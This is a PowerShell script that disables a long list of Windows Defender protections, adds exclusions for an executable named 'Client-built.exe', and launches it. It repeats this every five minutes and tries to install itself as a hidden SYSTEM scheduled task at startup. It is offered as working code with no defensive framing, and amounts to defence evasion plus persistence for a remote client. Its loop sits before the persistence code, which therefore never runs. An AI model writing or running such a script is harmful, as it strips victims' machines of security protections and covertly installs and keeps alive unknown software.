$taskName = "DisableDefenderAndRunClient"
$scriptPath = "C:\Scripts\DisableDefenderAndRunClient.ps1"
$programPath = "C:\Scripts\Client-built.exe"
$programProcess = "client.exe"                              
$programFullPath = "C:\Scripts\Client-built.exe"      

function Disable-WindowsDefenderAndRunProgram {
    Write-Output "Disabling Windows Defender options, adding exclusions, and running client.exe..."

    # Disable Real-Time Protection
    Set-MpPreference -DisableRealtimeMonitoring $true

    # Disable Cloud-Delivered Protection
    Set-MpPreference -MAPSReporting Disabled

    # Disable Automatic Sample Submission
    Set-MpPreference -SubmitSamplesConsent NeverSend

    # Disable Behavior Monitoring
    Set-MpPreference -DisableBehaviorMonitoring $true

    # Disable Script Scanning
    Set-MpPreference -DisableScriptScanning $true

    # Disable Network Protection
    Set-MpPreference -DisableIntrusionPreventionSystem $true

    # Disable IOAV Protection 
    Set-MpPreference -DisableIOAVProtection $true

    # Disable Block at First Sight
    Set-MpPreference -DisableBlockAtFirstSeen $true

    # Disable Controlled Folder Access
    Set-MpPreference -EnableControlledFolderAccess Disabled

    # Disable PUA Protection
    Set-MpPreference -PUAProtection Disabled

    # Add exclusion for your specific program folder and process
    Add-MpPreference -ExclusionPath $programPath
    Add-MpPreference -ExclusionProcess $programProcess

    # Run the client executable
    Start-Process -FilePath $programFullPath
    Write-Output "Windows Defender options disabled, exclusions added, and client.exe started."
}

while ($true) {
    Disable-WindowsDefenderAndRunProgram
    Start-Sleep -Seconds 300  # Wait for 300 seconds (5 minutes)
}
if (-Not (Test-Path $scriptPath)) {
    # Save the current script content to the specified path
    $currentScriptContent = Get-Content -Path $MyInvocation.MyCommand.Path
    $currentScriptContent | Set-Content -Path $scriptPath
}

# Create the scheduled task action to run the script on startup
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""

# Create the trigger to start the task at system startup
$trigger = New-ScheduledTaskTrigger -AtStartup

# Set the task principal to run with the highest privileges and hidden
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Register the scheduled task
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Disables Windows Defender, adds exclusions, and runs client.exe at startup." -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable)

Write-Output "Scheduled task '$taskName' created successfully. The script will run hidden at startup."
